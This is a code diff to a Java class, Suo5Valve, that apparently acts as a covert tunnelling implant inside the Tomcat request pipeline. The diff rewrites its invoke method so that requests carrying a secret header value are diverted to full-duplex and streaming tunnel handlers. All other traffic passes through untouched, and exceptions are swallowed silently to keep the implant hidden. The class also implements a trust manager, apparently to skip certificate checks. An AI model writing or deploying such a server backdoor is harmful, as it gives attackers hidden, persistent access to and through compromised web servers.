@@ -27,8 +27,6 @@ public class Suo5Valve implements Valve, Runnable, HostnameVerifier, X509TrustMa
 
     InputStream gInStream;
     OutputStream gOutStream;
-    protected Valve next;
-    protected boolean asyncSupported;
 
     public Suo5Valve() {
     }
@@ -37,6 +35,34 @@ public class Suo5Valve implements Valve, Runnable, HostnameVerifier, X509TrustMa
         this.gInStream = gInStream;
         this.gOutStream = gOutStream;
     }
+
+    @Override
+    @SuppressWarnings("all")
+    public void invoke(Request request, Response response) throws IOException, ServletException {
+        try {
+            String contentType = request.getContentType();
+            if (request.getHeader(headerName) != null
+                    && request.getHeader(headerName).contains(headerValue)
+                    && contentType != null) {
+                if (contentType.equals("application/plain")) {
+                    tryFullDuplex(request, response);
+                    return;
+                }
+
+                if (contentType.equals("application/octet-stream")) {
+                    processDataBio(request, response);
+                } else {
+                    processDataUnary(request, response);
+                }
+                return;
+            }
+        } catch (Throwable ignored) {
+        }
+        this.getNext().invoke(request, response);
+    }
+
+    protected Valve next;
+    protected boolean asyncSupported;
 
     @Override
     public Valve getNext() {
@@ -56,42 +82,6 @@ public class Suo5Valve implements Valve, Runnable, HostnameVerifier, X509TrustMa
     @Override
     public void backgroundProcess() {
     }
-
-    @Override
-    @SuppressWarnings("all")
-    public void invoke(Request request, Response response) throws IOException, ServletException {
-        try {
-            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
-                String contentType = request.getContentType();
-                if (contentType == null) {
-                    this.getNext().invoke(request, response);
-                    return;
-                }
-                try {
-                    if (contentType.equals("application/plain")) {
-                        tryFullDuplex(request, response);
-                        this.getNext().invoke(request, response);
-                        return;
-                    }
-
-                    if (contentType.equals("application/octet-stream")) {
-                        processDataBio(request, response);
-                    } else {
-                        processDataUnary(request, response);
-                    }
-                } catch (Throwable e) {
-//                System.out.printf("process data error %s\n", e);
-//                e.printStackTrace();
-                }
-            } else {
-                this.getNext().invoke(request, response);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-            this.getNext().invoke(request, response);
-        }
-    }
-
 
     public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
         int bufferOffset = 0;
